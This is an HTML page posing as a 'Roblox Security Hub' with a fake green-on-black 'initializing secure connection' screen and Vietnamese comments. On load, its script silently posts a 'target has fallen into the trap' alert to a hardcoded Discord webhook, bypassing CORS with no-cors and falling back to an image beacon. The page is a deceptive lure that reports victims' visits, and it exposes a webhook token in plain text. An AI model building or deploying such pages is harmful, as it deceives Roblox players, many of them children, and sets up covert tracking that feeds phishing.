<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Roblox Security Hub</title>
</head>
<body style="background:#000; color:#0f0; font-family:monospace; text-align:center; padding-top:20%;">
    <div style="border:2px solid #0f0; display:inline-block; padding:30px;">
        <h1>SYSTEM: INITIALIZING...</h1>
        <p id="status">Đang thiết lập đường truyền bảo mật...</p>
    </div>

    <script>
        // WEBHOOK CỦA BẠN
        const url = "https://discord.com/api/webhooks/1482022951615201363/4tr2Yrhvb0ihNmih4fUnFRlkUXbafTFpXIXyF9m4i6dakilr4_2hS9Bwf2nKTCXRwOAh";

        function send_fire() {
            // Sử dụng hình thức gửi dữ liệu thô để tránh bị trình duyệt chặn CORS
            const data = {
                content: "💀 **FIRE: MỤC TIÊU ĐÃ SẬP BẪY!** 💀",
                embeds: [{ title: "Tín hiệu từ: bangdaito123-hub", color: 16711680 }]
            };

            // ÉP GỬI DỮ LIỆU
            fetch(url, {
                method: "POST",
                mode: "no-cors", // BỎ QUA KIỂM TRA BẢO MẬT TRÌNH DUYỆT
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify(data)
            }).then(() => {
                document.getElementById("status").innerText = "ĐANG ĐỒNG BỘ: 95%";
            }).catch(() => {
                // Nếu fetch thất bại, dùng phương án dự phòng (Image Beacon)
                const img = new Image();
                img.src = url + "?data=" + btoa(JSON.stringify(data));
            });
        }

        // KÍCH HOẠT NGAY
        send_fire();
    </script>
</body>
</html>
